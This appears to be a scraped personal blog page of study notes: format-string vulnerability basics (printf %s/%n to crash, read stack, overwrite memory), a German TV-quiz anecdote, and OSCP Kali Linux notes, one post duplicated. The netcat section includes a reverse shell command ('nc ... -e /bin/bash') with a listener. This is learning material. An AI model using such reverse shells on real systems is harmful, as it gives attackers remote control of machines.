<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Correct</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span> <span class="params">(<span class="keyword">char</span> *user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">"%s"</span>, user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-2-Format-family"><a href="#1-3-2-Format-family" class="headerlink" title="1.3.2 Format family"></a>1.3.2 Format family</h3><ul>
<li>fprint - prints to a FILE stream</li>
<li>print  - prints to the ‘stdout’ stream</li>
<li>sprintf - prints into a string</li>
<li>snprintf - prints into a string with length checking</li>
</ul>
<p>some relatives:</p>
<ul>
<li>setproctitle - set argv[]</li>
<li>syslog - output to the syslog facility</li>
<li>others like err<em>, verr</em>, vwarn*</li>
</ul>
<h3 id="1-3-3-What-is-a-format-string"><a href="#1-3-3-What-is-a-format-string" class="headerlink" title="1.3.3 What is a format string?"></a>1.3.3 What is a format string?</h3><p>A fortmat string is an ASCIIZ string that contains text and format parameter.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">"The magic number is: \x25d\n"</span>, <span class="number">23</span>);</span><br></pre></td></tr></table></figure>

<p>Above code works because 0x25 is the %, and \ symbol is something try to interprete the special characters for compiler.</p>
<h2 id="2-1-what-are-we-able-to-control"><a href="#2-1-what-are-we-able-to-control" class="headerlink" title="2.1 what are we able to control"></a>2.1 what are we able to control</h2><h3 id="2-1-1-Crach-of-the-program"><a href="#2-1-1-Crach-of-the-program" class="headerlink" title="2.1.1 Crach of the program"></a>2.1.1 Crach of the program</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s"</span>);</span><br></pre></td></tr></table></figure>

<p>Since %s displays memory from an address that is supplied on the stack.展示的是stack地址上所表征的字符串。</p>
<table>
<thead>
<tr>
<th>parameter</th>
<th>output</th>
<th>passed as</th>
</tr>
</thead>
<tbody><tr>
<td>%s</td>
<td>string</td>
<td>reference</td>
</tr>
<tr>
<td>%n</td>
<td>number of bytes written so far</td>
<td>reference</td>
</tr>
</tbody></table>
<p>我们很有可能拿到illegal address，就是没有map任何memory，%n也是同样的道理，因此我们重复使用多次之后，就可以保证crash is present.</p>
<p>2.1.2 Viewing the process memory 查看进程的记忆体</p>
<p>利用format function - 各类printf及其亲属的打印功能，可以查看很多information</p>
<p>####2.1.3Viewing the stack</p>
<p>查看format string:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%08x.%08x\n"</span>);</span><br></pre></td></tr></table></figure>

<p>From bottom upward to the top of the stack - assuming the stack grows towards the low addresses</p>
<p>到底是指看哪里的数据？？？</p>
<h3 id="2-1-4-View-memory-at-any-location"><a href="#2-1-4-View-memory-at-any-location" class="headerlink" title="2.1.4 View memory at any location"></a>2.1.4 View memory at any location</h3><p>指哪里看哪里!</p>
<p>Tthis poses 2 problems to us: First, we have to find a format parameter which uses an address as stack parameter and displays memory from there, and we have to supply the address. 首先我们需要找到format参数，Which用地址作为stack参数并且从那儿显示记忆体（大哥这不就是char * - %s 这种变量吗）, 另外，我们需要提供地址。%s提供这种功能，通常显示ASCIIZ 字符串， 所以还剩下一个问题，如何拿到stack上的地址（suppose to be the address which we want to know）, into the right place.</p>
<h3 id="2-1-5-Overwriting-of-arbitrary-memory"><a href="#2-1-5-Overwriting-of-arbitrary-memory" class="headerlink" title="2.1.5 Overwriting of arbitrary memory"></a>2.1.5 Overwriting of arbitrary memory</h3><p>The holy grail of expoitation is to take control of the instruction pointer of a process.<br>IP or also called PC(Instruction pointer) is a register in the CPU and cannot be modified directly, only machine instructions can change it.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/Schreiben/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/13/Schreiben/" itemprop="url">Schreiben</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-13T23:12:15+02:00">
                2020-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Artikle-1"><a href="#Artikle-1" class="headerlink" title="Artikle 1"></a>Artikle 1</h1><p>Heute habe ich eine Fernsehsendung zugeschaut, der Name von der Fernsehsendung ist Leben der Hoffnung. Viele Chinesische Bruehmtheitent nehmen die Sendung teil.</p>
<p>Was moechte ich erzaehlen, dass es ein interestes Spiel ist, die in der Sendung gibt.  Zum beispiele, Herr He fragte, bitte finden Sie die Regel : A ist der Hund, B ist das Fenster, C ist die Heizung, was ist D?</p>
<p>Mann A antworte: Der Tisch?</p>
<p>Herr He: Falsch.</p>
<p>Mann A : Die Katze?</p>
<p>Herr He: Falsch auch.</p>
<p>Mann B antworte: D ist Herr He.</p>
<p>Herr He: Richtig!</p>
<p>Mann A: Was ist denn so? Noch eine Frage bitte.</p>
<p>Herr He: Bitte finden Sie die Regel, A ist Englisch, B ist Deutsch, C ist Chinesisch, was ist D?</p>
<p>Mann A: Spanisch?</p>
<p>Herr He: Falsch.</p>
<p>Mann A: Franzoesisch?</p>
<p>Herr He: Nie, nie.</p>
<p>Mann B: D ist Bruce Lee.</p>
<p>Herr He: Richtig.</p>
<p>Mann A: was?Sie haben kein Recht.</p>
<p>Herr He: Ja, es gibt eine Regel~</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/OSCP-Go/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/13/OSCP-Go/" itemprop="url">OSCP_Go</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-13T18:04:25+02:00">
                2020-05-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OSCP/" itemprop="url" rel="index">
                    <span itemprop="name">OSCP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-Tag-0x01"><a href="#1-Tag-0x01" class="headerlink" title="1.Tag 0x01"></a>1.Tag 0x01</h1><h2 id="1-1-Online-documentation"><a href="#1-1-Online-documentation" class="headerlink" title="1.1 Online documentation"></a>1.1 Online documentation</h2><ol>
<li><a href="https://docs.kali.org" target="_blank" rel="noopener">https://docs.kali.org</a></li>
<li><a href="https://forums.kali.org" target="_blank" rel="noopener">https://forums.kali.org</a></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name sdb*</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Service"><a href="#1-2-Service" class="headerlink" title="1.2 Service"></a>1.2 Service</h2><p>default installation : ssh, https,mySQL</p>
<p>ssh service:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#systemctl start ssh</span><br><span class="line">#ss -antlp |grep sshd</span><br><span class="line">#systemctl enable ssh</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl start apache2</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ss -antlp |grep apache</span></span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl <span class="built_in">enable</span> apache2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl list-unit-files</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2 linux"></a>1.2 linux</h2><h3 id="1-2-1-some-folders"><a href="#1-2-1-some-folders" class="headerlink" title="1.2.1 some folders"></a>1.2.1 some folders</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/</span><br><span class="line">/sbin/</span><br><span class="line">/etc/</span><br><span class="line">/tmp/</span><br><span class="line">/usr/bin/</span><br><span class="line">/usr/share/</span><br></pre></td></tr></table></figure>

<p>###2.1.2 basic linux commands</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man (-k)(5)</span><br><span class="line">ls -a -l</span><br><span class="line">cd ~</span><br><span class="line">mkdir -p &#123;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-3-powerful-apt"><a href="#1-3-powerful-apt" class="headerlink" title="1.3 powerful apt"></a>1.3 powerful apt</h2><p>Searching installing Tools</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt</span><br><span class="line">apt update &#x2F;&#x2F;版本更新</span><br><span class="line">apt upgrade &#x2F;&#x2F;升级换代</span><br><span class="line">apt list --upgradable</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search pure-ftpd</span><br><span class="line">apt show resource-agents | less</span><br></pre></td></tr></table></figure>

<p>installation and uninstalation</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install </span><br><span class="line">apt remove --purge</span><br><span class="line">dpkg #abbreviation of Debian Package</span><br></pre></td></tr></table></figure>



<h2 id="1-4-Shell"><a href="#1-4-Shell" class="headerlink" title="1.4 Shell"></a>1.4 Shell</h2><h3 id="1-4-1-definition"><a href="#1-4-1-definition" class="headerlink" title="1.4.1 definition"></a>1.4.1 definition</h3><p>command-line interpreter</p>
<p>linux shell - bash shell</p>
<h3 id="1-4-2-bash-environment"><a href="#1-4-2-bash-environment" class="headerlink" title="1.4.2 bash environment"></a>1.4.2 bash environment</h3><h4 id="1-4-2-1-echo"><a href="#1-4-2-1-echo" class="headerlink" title="1.4.2.1 echo"></a>1.4.2.1 echo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo $USER</span><br><span class="line">echo $PWD</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2-2-variables"><a href="#1-4-2-2-variables" class="headerlink" title="1.4.2.2 variables"></a>1.4.2.2 variables</h4><p>​    Shell allows users to define variables, whose value is assigned by users.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export b=10.11.1.220</span><br><span class="line">ping -c 2 $b #only exit in current shell</span><br><span class="line">echo $b</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">export</span> othervar=<span class="string">"glocal var"</span></span><br><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">echo</span> <span class="variable">$othervar</span> </span><br><span class="line">glocal var</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2-3-Bash-history-trick"><a href="#1-4-2-3-Bash-history-trick" class="headerlink" title="1.4.2.3 Bash history trick"></a>1.4.2.3 Bash history trick</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">!number</span><br><span class="line">ctrl+R(Search command in the history)</span><br></pre></td></tr></table></figure>

<h3 id="1-4-3-Piping-and-Redirection"><a href="#1-4-3-Piping-and-Redirection" class="headerlink" title="1.4.3 Piping and Redirection"></a>1.4.3 Piping and Redirection</h3><p>stream:1.STDIN.2.STDOUT.3STDERR</p>
<p>To be updated </p>
<h1 id="2-Tag-0x02"><a href="#2-Tag-0x02" class="headerlink" title="2. Tag 0x02"></a>2. Tag 0x02</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps -e -f <span class="comment">#all processes</span></span><br><span class="line"><span class="comment"># -e select All=-A #full format</span></span><br><span class="line"><span class="built_in">jobs</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>



<p>display the background process</p>
<h1 id="3-Tag-0x03"><a href="#3-Tag-0x03" class="headerlink" title="3. Tag 0x03"></a>3. Tag 0x03</h1><h2 id="3-1-Practical-tools"><a href="#3-1-Practical-tools" class="headerlink" title="3.1 Practical tools"></a>3.1 Practical tools</h2><h3 id="3-1-1-netcat"><a href="#3-1-1-netcat" class="headerlink" title="3.1.1 netcat"></a>3.1.1 netcat</h3><p>netcat is a swiss knife. Connect to the TCP/IP and UDP/IP</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping mail.139.com</span><br><span class="line">PING mail.139.com (221.176.9.121) 56(84) bytes of data</span><br></pre></td></tr></table></figure>

<p>nc is the abbreviation of netcat.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -n -v 221.176.9.121 110</span><br><span class="line"><span class="meta">#</span><span class="bash"> -n: numeric-only IP addresses, no DNS</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -v: verbose [use twice to be more verbose]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">-n -v mentioned before</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-l listen, -p port</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>example</p>
<p>Alice</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">Blind，盲目的</span></span><br></pre></td></tr></table></figure>
<p>Bob</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.230.10 4444 -e /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">reverse,送上门被控制</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="3-1-2-socat"><a href="#3-1-2-socat" class="headerlink" title="3.1.2 socat"></a>3.1.2 socat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#socat - TCP4:XXX.XXX.XXX.XXX:XXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client1/LINUX</span><br><span class="line">sudo socat TCP4-LISTEN:443 STDOUT</span><br><span class="line"><span class="meta">#</span><span class="bash">socat TCP4-LISTEN:443 STDOUT</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client2/Windows</span><br><span class="line">sudo socat - TCP4:192.168.119.230:443</span><br></pre></td></tr></table></figure>

<p>After the construction of connection, we could communicate.</p>
<h1 id="9-Tag-0x09"><a href="#9-Tag-0x09" class="headerlink" title="9. Tag 0x09"></a>9. Tag 0x09</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/ECC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/13/ECC/" itemprop="url">OSCP_Go</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-13T18:04:25+02:00">
                2020-05-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OSCP/" itemprop="url" rel="index">
                    <span itemprop="name">OSCP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-Tag-0x01"><a href="#1-Tag-0x01" class="headerlink" title="1.Tag 0x01"></a>1.Tag 0x01</h1><h2 id="1-1-Online-documentation"><a href="#1-1-Online-documentation" class="headerlink" title="1.1 Online documentation"></a>1.1 Online documentation</h2><ol>
<li><a href="https://docs.kali.org" target="_blank" rel="noopener">https://docs.kali.org</a></li>
<li><a href="https://forums.kali.org" target="_blank" rel="noopener">https://forums.kali.org</a></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name sdb*</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Service"><a href="#1-2-Service" class="headerlink" title="1.2 Service"></a>1.2 Service</h2><p>default installation : ssh, https,mySQL</p>
<p>ssh service:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#systemctl start ssh</span><br><span class="line">#ss -antlp |grep sshd</span><br><span class="line">#systemctl enable ssh</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl start apache2</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ss -antlp |grep apache</span></span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl <span class="built_in">enable</span> apache2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">systemctl list-unit-files</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2 linux"></a>1.2 linux</h2><h3 id="1-2-1-some-folders"><a href="#1-2-1-some-folders" class="headerlink" title="1.2.1 some folders"></a>1.2.1 some folders</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/</span><br><span class="line">/sbin/</span><br><span class="line">/etc/</span><br><span class="line">/tmp/</span><br><span class="line">/usr/bin/</span><br><span class="line">/usr/share/</span><br></pre></td></tr></table></figure>

<p>###2.1.2 basic linux commands</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man (-k)(5)</span><br><span class="line">ls -a -l</span><br><span class="line">cd ~</span><br><span class="line">mkdir -p &#123;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="1-3-powerful-apt"><a href="#1-3-powerful-apt" class="headerlink" title="1.3 powerful apt"></a>1.3 powerful apt</h2><p>Searching installing Tools</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt</span><br><span class="line">apt update &#x2F;&#x2F;版本更新</span><br><span class="line">apt upgrade &#x2F;&#x2F;升级换代</span><br><span class="line">apt list --upgradable</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search pure-ftpd</span><br><span class="line">apt show resource-agents | less</span><br></pre></td></tr></table></figure>

<p>installation and uninstalation</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install </span><br><span class="line">apt remove --purge</span><br><span class="line">dpkg #abbreviation of Debian Package</span><br></pre></td></tr></table></figure>



<h2 id="1-4-Shell"><a href="#1-4-Shell" class="headerlink" title="1.4 Shell"></a>1.4 Shell</h2><h3 id="1-4-1-definition"><a href="#1-4-1-definition" class="headerlink" title="1.4.1 definition"></a>1.4.1 definition</h3><p>command-line interpreter</p>
<p>linux shell - bash shell</p>
<h3 id="1-4-2-bash-environment"><a href="#1-4-2-bash-environment" class="headerlink" title="1.4.2 bash environment"></a>1.4.2 bash environment</h3><h4 id="1-4-2-1-echo"><a href="#1-4-2-1-echo" class="headerlink" title="1.4.2.1 echo"></a>1.4.2.1 echo</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">echo $USER</span><br><span class="line">echo $PWD</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2-2-variables"><a href="#1-4-2-2-variables" class="headerlink" title="1.4.2.2 variables"></a>1.4.2.2 variables</h4><p>​    Shell allows users to define variables, whose value is assigned by users.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export b=10.11.1.220</span><br><span class="line">ping -c 2 $b #only exit in current shell</span><br><span class="line">echo $b</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">export</span> othervar=<span class="string">"glocal var"</span></span><br><span class="line">xs@kaka:~/Dropbox/deleteme$ <span class="built_in">echo</span> <span class="variable">$othervar</span> </span><br><span class="line">glocal var</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2-3-Bash-history-trick"><a href="#1-4-2-3-Bash-history-trick" class="headerlink" title="1.4.2.3 Bash history trick"></a>1.4.2.3 Bash history trick</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">!number</span><br><span class="line">ctrl+R(Search command in the history)</span><br></pre></td></tr></table></figure>

<h3 id="1-4-3-Piping-and-Redirection"><a href="#1-4-3-Piping-and-Redirection" class="headerlink" title="1.4.3 Piping and Redirection"></a>1.4.3 Piping and Redirection</h3><p>stream:1.STDIN.2.STDOUT.3STDERR</p>
<p>To be updated </p>
<h1 id="2-Tag-0x02"><a href="#2-Tag-0x02" class="headerlink" title="2. Tag 0x02"></a>2. Tag 0x02</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps -e -f <span class="comment">#all processes</span></span><br><span class="line"><span class="comment"># -e select All=-A #full format</span></span><br><span class="line"><span class="built_in">jobs</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>



<p>display the background process</p>
<h1 id="3-Tag-0x03"><a href="#3-Tag-0x03" class="headerlink" title="3. Tag 0x03"></a>3. Tag 0x03</h1><h2 id="3-1-Practical-tools"><a href="#3-1-Practical-tools" class="headerlink" title="3.1 Practical tools"></a>3.1 Practical tools</h2><h3 id="3-1-1-netcat"><a href="#3-1-1-netcat" class="headerlink" title="3.1.1 netcat"></a>3.1.1 netcat</h3><p>netcat is a swiss knife. Connect to the TCP/IP and UDP/IP</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping mail.139.com</span><br><span class="line">PING mail.139.com (221.176.9.121) 56(84) bytes of data</span><br></pre></td></tr></table></figure>

<p>nc is the abbreviation of netcat.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -n -v 221.176.9.121 110</span><br><span class="line"><span class="meta">#</span><span class="bash"> -n: numeric-only IP addresses, no DNS</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -v: verbose [use twice to be more verbose]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">-n -v mentioned before</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-l listen, -p port</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>example</p>
<p>Alice</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"><span class="meta">#</span><span class="bash">Blind，盲目的</span></span><br></pre></td></tr></table></figure>
<p>Bob</p>
